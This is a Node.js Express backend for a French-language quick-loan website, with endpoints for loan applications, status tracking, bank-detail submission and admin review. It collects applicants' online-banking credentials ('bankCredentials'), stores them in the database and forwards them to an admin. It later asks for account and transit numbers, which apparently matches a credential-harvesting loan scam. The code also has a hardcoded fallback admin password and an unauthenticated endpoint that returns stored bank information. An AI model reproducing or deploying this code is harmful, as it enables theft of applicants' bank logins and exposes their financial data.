const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const { query } = require('../lib/db.js');
const {
  sendClientConfirmation,
  sendAdminNotification,
  sendAdminBankInfoNotification,
  sendStatusUpdateEmail,
} = require('../lib/mailer.js');

const app = express();

app.use(cors({ origin: ['https://pret-rapide.vercel.app', 'http://localhost:5173', 'http://localhost:3000'] }));
app.use(express.json({ limit: '10mb' }));

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '2026#*';

function generateTrackingNumber() {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  const bytes = crypto.randomBytes(8);
  let s = '';
  for (let i = 0; i < 8; i++) s += chars[bytes[i] % chars.length];
  return `PR-${s}`;
}

function isAdminAuthed(req) {
  const provided =
    (req.headers['x-admin-password'] || '').trim() ||
    (req.headers.authorization || '').replace(/^Bearer\s+/i, '').trim();
  return provided === ADMIN_PASSWORD;
}

async function insertLoanRequest(data, trackingNumber) {
  const sql = `
    INSERT INTO loan_requests (
      tracking_number, full_name, phone, email, address, city, postal_code,
      loan_amount, monthly_income, profession, next_payday, joint_request,
      loan_purpose, desired_date, bank_name, bank_credentials
    ) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16)
    RETURNING *`;
  const vals = [
    trackingNumber,
    data.fullName || null,
    data.phone || null,
    data.email || null,
    data.address || null,
    data.city || null,
    data.postalCode || null,
    data.loanAmount ? parseFloat(data.loanAmount) : null,
    data.monthlyIncome ? parseFloat(data.monthlyIncome) : null,
    data.profession || null,
    data.nextPayday || null,
    data.jointRequest === true || data.jointRequest === 'oui' ? true : false,
    data.loanPurpose || null,
    data.desiredDate || null,
    data.bankName || data.bankId || null,
    data.bankCredentials ? JSON.stringify(data.bankCredentials) : null,
  ];
  return query(sql, vals);
}

app.post('/api/loan', async (req, res) => {
  try {
    const data = req.body || {};
    console.log('📋 Nouvelle demande de prêt reçue:', JSON.stringify({ ...data, bankCredentials: undefined }, null, 2));

    const bankName = data.bankName || data.bankId || 'Inconnue';
    const trackingNumber = generateTrackingNumber();

    const dbRes = await insertLoanRequest(data, trackingNumber);
    const stored = !dbRes.mock;
    const fullData = { ...data, bankName };

    const promises = [sendAdminNotification({ ...fullData, trackingNumber })];

    if (data.email) {
      promises.push(sendClientConfirmation({
        email: data.email,
        firstName: data.fullName?.split(' ')[0] || 'Client',
        loanAmount: data.loanAmount,
        monthlyIncome: data.monthlyIncome,
        bankName,
        trackingNumber,
      }));
    }

    await Promise.all(promises);

    res.json({ success: true, message: 'Demande soumise avec succès', trackingNumber, stored });
  } catch (err) {
    console.error('❌ Erreur:', err);
    res.status(500).json({ success: false, message: 'Erreur lors du traitement' });
  }
});

app.get('/api/tracking/:number', async (req, res) => {
  try {
    const number = (req.params.number || '').trim().toUpperCase();
    if (!number) return res.status(400).json({ success: false, message: 'Numéro manquant' });

    const dbRes = await query(
      `SELECT id, tracking_number, full_name, email, status, bank_info, bank_info_status, bank_info_image, admin_message, created_at, updated_at, loan_amount, bank_name
       FROM loan_requests WHERE tracking_number = $1 LIMIT 1`,
      [number]
    );

    if (dbRes.mock) {
      return res.json({ success: true, trackingNumber: number, status: 'en_attente', bankInfoStatus: null, bankInfo: null, adminMessage: null, fullName: null, email: null, mock: true });
    }

    if (!dbRes.rows.length) return res.status(404).json({ success: false, message: 'Dossier introuvable' });

    const row = dbRes.rows[0];
    res.json({
      success: true,
      id: row.id,
      trackingNumber: row.tracking_number,
      fullName: row.full_name,
      email: row.email,
      loanAmount: row.loan_amount ? Number(row.loan_amount) : null,
      bankName: row.bank_name,
      status: row.status,
      bankInfo: row.bank_info,
      bankInfoStatus: row.bank_info_status,
      bankInfoImage: row.bank_info_image,
      adminMessage: row.admin_message,
      createdAt: row.created_at,
      updatedAt: row.updated_at,
    });
  } catch (err) {
    console.error('❌ Erreur suivi:', err);
    res.status(500).json({ success: false, message: 'Erreur lors du suivi' });
  }
});

app.post('/api/tracking/:number/bank-info', async (req, res) => {
  try {
    const number = (req.params.number || '').trim().toUpperCase();
    const body = req.body || {};

    const hasImage = !!(body.bankInfoImage || '').toString().trim();
    const hasManual = !!(body.bankName || '').toString().trim() && !!(body.accountNumber || '').toString().trim();
    if (!hasImage && !hasManual) {
      return res.status(400).json({ success: false, message: 'Fournissez les informations bancaires ou une image' });
    }

    const dbRes = await query(
      `SELECT id, tracking_number, full_name, email, status FROM loan_requests WHERE tracking_number = $1 LIMIT 1`,
      [number]
    );

    if (dbRes.mock) {
      return res.json({ success: true, mock: true, message: 'Informations bancaires reçues (mode démo)' });
    }
    if (!dbRes.rows.length) return res.status(404).json({ success: false, message: 'Dossier introuvable' });

    const row = dbRes.rows[0];
    if (row.status !== 'confirmee') {
      return res.status(400).json({ success: false, message: 'La demande doit être confirmée avant de fournir les informations bancaires' });
    }

    const bankInfo = {
      bankName: (body.bankName || '').trim(),
      accountNumber: (body.accountNumber || '').trim(),
      transitNumber: (body.transitNumber || '').trim(),
      institutionNumber: (body.institutionNumber || '').trim(),
    };
    const bankInfoImage = (body.bankInfoImage || '').toString().slice(0, 8000000) || null;

    await query(
      `UPDATE loan_requests SET bank_info = $1, bank_info_image = $2, bank_info_status = 'en_attente', updated_at = now() WHERE tracking_number = $3`,
      [JSON.stringify(bankInfo), bankInfoImage, number]
    );

    await sendAdminBankInfoNotification({
      fullName: row.full_name,
      email: row.email,
      trackingNumber: number,
      bankInfo,
      bankInfoImage,
    });

    res.json({ success: true, message: 'Informations bancaires enregistrées' });
  } catch (err) {
    console.error('❌ Erreur infos bancaires:', err);
    res.status(500).json({ success: false, message: 'Erreur lors de l\'enregistrement' });
  }
});

app.get('/api/admin/requests', async (req, res) => {
  if (!isAdminAuthed(req)) return res.status(401).json({ success: false, message: 'Accès refusé' });
  try {
    const dbRes = await query(
      `SELECT id, tracking_number, full_name, phone, email, loan_amount, bank_name, status,
              bank_info_status, bank_info, bank_info_image, admin_message, created_at, updated_at
       FROM loan_requests ORDER BY created_at DESC`
    );
    const rows = dbRes.mock ? [] : dbRes.rows.map(r => ({
      id: r.id,
      trackingNumber: r.tracking_number,
      fullName: r.full_name,
      phone: r.phone,
      email: r.email,
      loanAmount: r.loan_amount ? Number(r.loan_amount) : null,
      bankName: r.bank_name,
      status: r.status,
      bankInfoStatus: r.bank_info_status,
      bankInfo: r.bank_info,
      bankInfoImage: r.bank_info_image,
      adminMessage: r.admin_message,
      createdAt: r.created_at,
      updatedAt: r.updated_at,
    }));
    res.json({ success: true, requests: rows });
  } catch (err) {
    console.error('❌ Erreur admin list:', err);
    res.status(500).json({ success: false, message: 'Erreur lors du chargement' });
  }
});

app.post('/api/admin/requests/:id', async (req, res) => {
  if (!isAdminAuthed(req)) return res.status(401).json({ success: false, message: 'Accès refusé' });
  try {
    const id = parseInt(req.params.id, 10);
    const { status, bankInfoStatus, adminMessage } = req.body || {};

    const dbRes = await query(
      `SELECT id, tracking_number, full_name, email, status, bank_info_status FROM loan_requests WHERE id = $1 LIMIT 1`,
      [id]
    );
    if (dbRes.mock) return res.json({ success: true, mock: true });
    if (!dbRes.rows.length) return res.status(404).json({ success: false, message: 'Dossier introuvable' });

    const row = dbRes.rows[0];
    const nextStatus = status !== undefined ? status : row.status;
    const nextBankStatus = bankInfoStatus !== undefined ? bankInfoStatus : row.bank_info_status;
    const nextMessage = adminMessage !== undefined ? adminMessage : null;

    await query(
      `UPDATE loan_requests SET status = $1, bank_info_status = $2, admin_message = $3, updated_at = now() WHERE id = $4`,
      [nextStatus, nextBankStatus, nextMessage, id]
    );

    const changed = status !== undefined && status !== row.status;

    if (row.email) {
      const statusToSend = status !== undefined ? status : (bankInfoStatus !== undefined ? bankInfoStatus : null);
      if (statusToSend) {
        await sendStatusUpdateEmail({
          email: row.email,
          firstName: row.full_name?.split(' ')[0] || 'Client',
          trackingNumber: row.tracking_number,
          status: statusToSend,
          adminMessage: nextMessage,
        });
      }
    }

    res.json({ success: true, message: 'Dossier mis à jour' });
  } catch (err) {
    console.error('❌ Erreur admin update:', err);
    res.status(500).json({ success: false, message: 'Erreur lors de la mise à jour' });
  }
});

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', time: new Date().toISOString() });
});

module.exports = app;